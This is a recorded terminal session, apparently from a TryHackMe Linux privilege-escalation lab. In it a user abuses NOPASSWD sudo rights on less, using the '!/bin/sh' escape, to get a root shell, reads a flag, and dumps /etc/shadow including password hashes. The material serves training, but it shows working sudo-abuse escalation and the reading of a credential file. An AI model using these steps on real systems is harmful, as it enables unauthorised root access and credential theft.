@@ -1,0 +1,176 @@
+Script started on 2025-03-14 19:42:11+03:00 [COMMAND="ssh karen@linux.privesc.thm" TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="104" LINES="27"]
+The authenticity of host 'linux.privesc.thm (10.10.39.207)' can't be established.
+ED25519 key fingerprint is SHA256:qTNNMjUM79wOyLCtr7Ak48x71JoD1eBYN5wFbhMMqMs.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'linux.privesc.thm' (ED25519) to the list of known hosts.
+karen@linux.privesc.thm's password: 
+Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-1029-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Fri Mar 14 16:42:20 UTC 2025
+
+  System load:  0.09              Processes:             103
+  Usage of /:   4.7% of 29.02GB   Users logged in:       0
+  Memory usage: 45%               IPv4 address for eth0: 10.10.39.207
+  Swap usage:   0%
+
+
+1 update can be installed immediately.
+0 of these updates are security updates.
+To see these additional updates run: apt list --upgradable
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Last login: Fri Jun 18 10:35:24 2021 from 10.9.2.27
+Could not chdir to home directory /home/karen: No such file or directory
+$ sudo -l
+Matching Defaults entries for karen on ip-10-10-39-207:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User karen may run the following commands on ip-10-10-39-207:
+    (ALL) NOPASSWD: /usr/bin/find
+    (ALL) NOPASSWD: /usr/bin/less
+    (ALL) NOPASSWD: /usr/bin/nano
+$ id
+uid=1001(karen) gid=1001(karen) groups=1001(karen)
+$ sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
+sudo: sorry, you are not allowed to set the following environment variables: LD_PRELOAD
+$ sudo less /etc/profile
+!/bin/sh[?1049h[22;0;0t[?1h=# /etc/profile: system-wide .profile file for the Bourne shell (sh(1))
+# and Bourne compatible shells (bash(1), ksh(1), ash(1), ...).
+
+if [ "${PS1-}" ]; then
+  if [ "${BASH-}" ] && [ "$BASH" != "/bin/sh" ]; then
+    # The file bash.bashrc already sets the default PS1.
+    # PS1='\h:\w\$ '
+    if [ -f /etc/bash.bashrc ]; then
+      . /etc/bash.bashrc
+    fi
+  else
+    if [ "`id -u`" -eq 0 ]; then
+      PS1='# '
+    else
+      PS1='$ '
+    fi
+  fi
+fi
+
+if [ -d /etc/profile.d ]; then
+  for i in /etc/profile.d/*.sh; do
+    if [ -r $i ]; then
+      . $i
+    fi
+  done
+  unset i
+[7m/etc/profile[27m[K[K![K//[Kbb[Kii[Knn[K//[Kss[Khh[K[K!/bin/sh
+[?1l>[?1049l[23;0;0t# di
+/bin/sh: 1: di: not found
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# ls
+bin   dev  home  lib32	libx32	    media  opt	 root  sbin  srv  tmp  var
+boot  etc  lib	 lib64	lost+found  mnt    proc  run   snap  sys  usr
+# cd /root
+# ls
+snap
+# cd h /home
+# ls
+ubuntu
+# cd ub	untu
+# ls
+flag2.txt
+# cat flag2.txt
+THM-402028394
+# cat /etc/. shadow
+root:*:18561:0:99999:7:::
+daemon:*:18561:0:99999:7:::
+bin:*:18561:0:99999:7:::
+sys:*:18561:0:99999:7:::
+sync:*:18561:0:99999:7:::
+games:*:18561:0:99999:7:::
+man:*:18561:0:99999:7:::
+lp:*:18561:0:99999:7:::
+mail:*:18561:0:99999:7:::
+news:*:18561:0:99999:7:::
+uucp:*:18561:0:99999:7:::
+proxy:*:18561:0:99999:7:::
+www-data:*:18561:0:99999:7:::
+backup:*:18561:0:99999:7:::
+list:*:18561:0:99999:7:::
+irc:*:18561:0:99999:7:::
+gnats:*:18561:0:99999:7:::
+nobody:*:18561:0:99999:7:::
+systemd-network:*:18561:0:99999:7:::
+systemd-resolve:*:18561:0:99999:7:::
+systemd-timesync:*:18561:0:99999:7:::
+messagebus:*:18561:0:99999:7:::
+syslog:*:18561:0:99999:7:::
+_apt:*:18561:0:99999:7:::
+tss:*:18561:0:99999:7:::
+uuidd:*:18561:0:99999:7:::
+tcpdump:*:18561:0:99999:7:::
+sshd:*:18561:0:99999:7:::
+landscape:*:18561:0:99999:7:::
+pollinate:*:18561:0:99999:7:::
+ec2-instance-connect:!:18561:0:99999:7:::
+systemd-coredump:!!:18796::::::
+ubuntu:!:18796:0:99999:7:::
+lxd:!:18796::::::
+karen:$6$QHTxjZ77ZcxU54ov$DCV2wd1mG5wJoTB.cXJoXtLVDZe1Ec1jbQFv3ICAYbnMqdhJzIEi3H4qyyKO7T75h4hHQWuWWzBH7brjZiSaX0:18796:0:99999:7:::
+frank:$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1:18796:0:99999:7:::
+# exit
+!done  (press RETURN)
+[?1049h[22;0;0t[?1h=[K...skipping...
+# /etc/profile: system-wide .profile file for the Bourne shell (sh(1))
+# and Bourne compatible shells (bash(1), ksh(1), ash(1), ...).
+
+if [ "${PS1-}" ]; then
+  if [ "${BASH-}" ] && [ "$BASH" != "/bin/sh" ]; then
+    # The file bash.bashrc already sets the default PS1.
+    # PS1='\h:\w\$ '
+    if [ -f /etc/bash.bashrc ]; then
+      . /etc/bash.bashrc
+    fi
+  else
+    if [ "`id -u`" -eq 0 ]; then
+      PS1='# '
+    else
+      PS1='$ '
+    fi
+  fi
+fi
+
+if [ -d /etc/profile.d ]; then
+  for i in /etc/profile.d/*.sh; do
+    if [ -r $i ]; then
+      . $i
+    fi
+  done
+  unset i
+[7m/etc/profile[27m[K[K:[K[K[?1l>[?1049l[23;0;0t$ exit
+Connection to linux.privesc.thm closed.
+
+Script done on 2025-03-14 19:49:39+03:00 [COMMAND_EXIT_CODE="0"]
